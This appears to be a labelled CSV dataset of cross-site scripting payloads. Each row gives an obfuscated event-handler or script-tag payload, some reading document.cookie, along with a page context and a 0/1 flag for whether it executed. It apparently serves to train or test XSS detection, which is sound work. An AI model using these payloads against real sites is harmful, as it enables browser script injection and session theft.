payload,context,exec,combined
<d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s
<d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s
<hTmL%0aONPOiNTEREnTer%09=%09[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <hTmL%0aONPOiNTEREnTer%09=%09[8].find(confirm)>
<hTml%09oNPOInTERENteR%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <hTml%09oNPOInTERENteR%0a=%0a(prompt)``%0dx//
"<D3v%0donPoinTErEnTEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0donPoinTErEnTEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s
<a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNmOuSeoveR%0d=%0d(prompt)``>v3dm0s
<a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s
<D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s
<htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//
<a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s
"data:text/html,<script>alert(document.domain)</script>",html_tag,0,"CONTEXT_html_tag data:text/html,<script>alert(document.domain)</script>"
<a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s
<detAIlS/+/OntoGGle%09=%09(prompt)``//,html_tag,0,CONTEXT_html_tag <detAIlS/+/OntoGGle%09=%09(prompt)``//
<detAILs%0doNpoInTErENtER+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <detAILs%0doNpoInTErENtER+=+confirm()%0dx>
"<A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_text,0,CONTEXT_html_text <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
<D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s
<HTmL%0dOnMOuSEOVeR%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HTmL%0dOnMOuSEOVeR%09=%09(confirm)()%0dx//
<d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s
<a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%09OnMOuSEover+=+(prompt)``%0dx>v3dm0s
"<iframe srcdoc=""<script>alert(1)</script>"">",html_text,0,"CONTEXT_html_text <iframe srcdoc=""<script>alert(1)</script>"">"
<dETAiLs/+/OnTOGGlE+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dETAiLs/+/OnTOGGlE+=+(confirm)()%0dx>
><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text ><svg/onload=alert(1)>
<A/+/ONMOusEOVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONMOusEOVER%09=%09[8].find(confirm)%0dx>v3dm0s
<d3v%0dOnMoUSEoVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dOnMoUSEoVEr%0d=%0dconfirm()>v3dm0s
"<DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//"
<htmL%0dOnPoinTERenter+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <htmL%0dOnPoinTERenter+=+(confirm)()%0dx//
<A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<d3v%0dOnMoUSEoVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dOnMoUSEoVEr%0d=%0dconfirm()>v3dm0s
<a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONpoInteRENTER%09=%09(confirm)()>v3dm0s
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>,html_text,0,CONTEXT_html_text <Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>
<D3v%0dONpoInTErENTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dONpoInTErENTEr%0d=%0d(prompt)``%0dx>v3dm0s
<HTMl%0aOnMoUSeOver%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <HTMl%0aOnMoUSeOver%09=%09(confirm)()>
"<DetAILS%09ontogGlE+=+a=prompt,a()%0dx>",url_navigation,0,"CONTEXT_url_navigation <DetAILS%09ontogGlE+=+a=prompt,a()%0dx>"
"<D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%09OnmoUseOVer%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,script_block,0,CONTEXT_script_block <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s
<HTml/+/ONmOUseovER%0d=%0dconfirm()//,html_tag,0,CONTEXT_html_tag <HTml/+/ONmOUseovER%0d=%0dconfirm()//
<Html/+/OnPOINTERENtER+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <Html/+/OnPOINTERENtER+=+confirm()%0dx>
"<dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <dEtAils%09oNpOinTEreNtER%0a=%0aa=prompt,a()//"
<d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aonMOuseOVeR%0d=%0d(confirm)()>v3dm0s
&amp;,html_text,0,CONTEXT_html_text &amp;
<D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/ONMoUSeOveR%09=%09confirm()>v3dm0s
<A%0dONMOUSEOVeR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONMOUSEOVeR%0d=%0dconfirm()%0dx>v3dm0s
"<htML%0donpOiNtEREnTER%0a=%0aa=prompt,a()>",html_attribute,0,"CONTEXT_html_attribute <htML%0donpOiNtEREnTER%0a=%0aa=prompt,a()>"
<a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s
<DetAiLs%0doNtoGGle%0d=%0d[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DetAiLs%0doNtoGGle%0d=%0d[8].find(confirm)>
<a%0aonMouSeover%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonMouSeover%0a=%0aconfirm()>v3dm0s
<HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>,html_text,0,CONTEXT_html_text <HtMl/+/OnMOUSeOVEr%09=%09(confirm)()%0dx>
"<htML%0aONpOIntereNtER%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <htML%0aONpOIntereNtER%0d=%0da=prompt,a()//"
<A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onPOINTEReNtEr%0d=%0d(prompt)``%0dx>v3dm0s
"<dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//"
<HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>
<d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s
<a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%0donPoinTErenTEr%0d=%0d(confirm)()>v3dm0s
<a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s
<D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s
<a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
<HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
&#60;iframe&#62;,html_text,0,CONTEXT_html_text &#60;iframe&#62;
"<html%0aONpOiNtErentEr%0a=%0aa=prompt,a()>",html_tag,0,"CONTEXT_html_tag <html%0aONpOiNtErentEr%0a=%0aa=prompt,a()>"
"<A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A/+/OnPOIntEREntER%09=%09a=prompt,a()>v3dm0s"
<A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s
<detAiLS%0dONToGgLE%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <detAiLS%0dONToGgLE%09=%09confirm()%0dx//
<Html%0aONmouSeOVEr%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <Html%0aONmouSeOVEr%0a=%0aconfirm()>
"<A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s"
<d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s
<HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//
<D3V/+/ONMoUSeover+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V/+/ONMoUSeover+=+confirm()%0dx>v3dm0s
<svg><script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(document.domain)</script>
""";alert(document.cookie);//",html_tag,0,"CONTEXT_html_tag "";alert(document.cookie);//"
<htMl%09onMouSEovER%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <htMl%09onMouSEovER%09=%09confirm()%0dx//
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<A/+/onMouSeOvER%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onMouSeOvER%09=%09(prompt)``>v3dm0s
<a%0aonMOUseOVEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonMOUseOVEr%0a=%0a(prompt)``%0dx>v3dm0s
"<a%0aOnpoiNTerEnteR+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <a%0aOnpoiNTerEnteR+=+a=prompt,a()>v3dm0s"
<A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s
<deTAILs/+/oNtOGGlE%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <deTAILs/+/oNtOGGlE%0d=%0d(confirm)()>
"<detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//",script_block,0,"CONTEXT_script_block <detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//"
<A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s
<d3v%0doNPOIntERentEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0doNPOIntERentEr%09=%09[8].find(confirm)>v3dm0s
<a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s
<D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s
<deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>,html_text,0,CONTEXT_html_text <deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>
<A/+/onMouSeOvER%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onMouSeOvER%09=%09(prompt)``>v3dm0s
<hTmL%0dOnPOINterenter%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <hTmL%0dOnPOINterenter%0a=%0a(confirm)()//
"<HTML%0donpoINTerenTER%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <HTML%0donpoINTerenTER%0d=%0da=prompt,a()%0dx//"
<A%0dONmOUSeoveR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONmOUSeoveR%09=%09confirm()%0dx>v3dm0s
"<d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s"
<DEtAiLS%0dOntOgglE%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DEtAiLS%0dOntOgglE%0a=%0a(confirm)()%0dx//
<d3v%0doNPOIntERentEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0doNPOIntERentEr%09=%09[8].find(confirm)>v3dm0s
<D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0donmoUSEovEr%0a=%0a(prompt)``%0dx>v3dm0s
<HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>
<HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//,html_text,0,CONTEXT_html_text <HtMl%0aONpoInTERenTeR%0a=%0aconfirm()%0dx//
"<DetAILS%09ontogGlE+=+a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DetAILS%09ontogGlE+=+a=prompt,a()%0dx>"
<detaIls%0dontoggLe%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <detaIls%0dontoggLe%09=%09confirm()//
"<HtmL%09OnMouSEOVer%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <HtmL%09OnMouSEOVer%0a=%0aa=prompt,a()//"
<A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONpOIntereNtER%09=%09confirm()%0dx>v3dm0s
"<htMl%0donmouSeovER%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <htMl%0donmouSeovER%0d=%0da=prompt,a()>"
<HtMl%09onpOiNTerEnTeR%09=%09(prompt)``>,html_text,0,CONTEXT_html_text <HtMl%09onpOiNTerEnTeR%09=%09(prompt)``>
<hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//,html_text,0,CONTEXT_html_text <hTML/+/oNPoiNteRENTeR%0a=%0a(prompt)``%0dx//
<DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//,html_text,0,CONTEXT_html_text <DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//
<D3v/+/OnPOIntERentER+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v/+/OnPOIntERentER+=+confirm()%0dx>v3dm0s
<HtML%0donmoUseoVER+=+(prompt)``//,html_text,0,CONTEXT_html_text <HtML%0donmoUseoVER+=+(prompt)``//
"<detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//"
<dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>,html_tag,0,CONTEXT_html_tag <dETaiLs%09onPoinTeRenTER%09=%09(prompt)``>
onmouseover=alert(1),html_attribute,1,CONTEXT_html_attribute onmouseover=alert(1)
<A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s,url_href,0,CONTEXT_url_href <A/+/OnMOuseOvEr%0d=%0d[8].find(confirm)>v3dm0s
""";alert(document.cookie);//",script_block,1,"CONTEXT_script_block "";alert(document.cookie);//"
<A%0dONMOUSEOVeR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONMOUSEOVeR%0d=%0dconfirm()%0dx>v3dm0s
<a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s
<HTml%0dOnmOuSEoVeR%09=%09(prompt)``//,html_tag,0,CONTEXT_html_tag <HTml%0dOnmOuSEoVeR%09=%09(prompt)``//
<A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNMouseOVEr%0d=%0dconfirm()>v3dm0s
<a%09oNMOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09oNMOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3v%0donMOUSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donMOUSEOveR%09=%09(prompt)``%0dx>v3dm0s
<hTML/+/oNPOInTeRENter+=+confirm()//,html_text,0,CONTEXT_html_text <hTML/+/oNPOInTeRENter+=+confirm()//
<d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s
"<a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s"
<deTaiLs%09onPOinteRenter%0d=%0d(prompt)``%0dx>,html_text,0,CONTEXT_html_text <deTaiLs%09onPOinteRenter%0d=%0d(prompt)``%0dx>
<DETaILs%0aOnpoiNtERenTEr+=+confirm()//,html_tag,0,CONTEXT_html_tag <DETaILs%0aOnpoiNtERenTEr+=+confirm()//
<A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s
<DEtaiLs%09oNpoinTErentEr+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <DEtaiLs%09oNpoinTErentEr+=+[8].find(confirm)>
<d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s
<d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s,url_href,0,CONTEXT_url_href <d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s
<a%09onMoUsEOVER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onMoUsEOVER%0a=%0a(confirm)()>v3dm0s
<a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s
"<d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s"
"<d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s"
<D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aonpOInTerENtEr%0a=%0a(prompt)``%0dx>v3dm0s
<A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s
<a%09oNMOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNMOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aoNMoUsEOVER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNMoUsEOVER%0a=%0aconfirm()>v3dm0s
<D3v%0doNMOUSEovER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0doNMOUSEovER%0a=%0a(prompt)``%0dx>v3dm0s
<A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNPoiNteREnter%0a=%0a[8].find(confirm)>v3dm0s
<img src=x onerror=alert(1)//>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//>
<DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//
<d3v%09ONmOUsEover%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09ONmOUsEover%09=%09(confirm)()%0dx>v3dm0s
"<a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aOnPointeREnTeR%0d=%0da=prompt,a()%0dx>v3dm0s"
"<a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s"
<dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>
<a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s
<htmL%0aoNmOUsEoveR%0d=%0d[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <htmL%0aoNmOUsEoveR%0d=%0d[8].find(confirm)%0dx//
<A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s
"<DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>",html_tag,0,"CONTEXT_html_tag <DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>"
<A%0aONMouseOVEr+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <A%0aONMouseOVEr+=+confirm()>v3dm0s
<hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//
"<DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//",url_navigation,0,"CONTEXT_url_navigation <DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//"
<html/+/onmoUSEOVER%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <html/+/onmoUSEOVER%09=%09confirm()%0dx>
""";alert(history.length);//",script_block,1,"CONTEXT_script_block "";alert(history.length);//"
</pre><svg/onload=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><svg/onload=alert`1`>
<d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s
<A%0aOnPOINTereNTer+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <A%0aOnPOINTereNTer+=+[8].find(confirm)>v3dm0s
<DETaIls%09oNtogGLe+=+[8].find(confirm)//,html_text,0,CONTEXT_html_text <DETaIls%09oNtogGLe+=+[8].find(confirm)//
"<HTMl/+/ONMouseoveR%0a=%0aa=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <HTMl/+/ONMouseoveR%0a=%0aa=prompt,a()%0dx>"
<a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnmouSeOVer%0a=%0a(confirm)()>v3dm0s
<detAilS%0doNTOgGle%09=%09confirm()>,html_text,0,CONTEXT_html_text <detAilS%0doNTOgGle%09=%09confirm()>
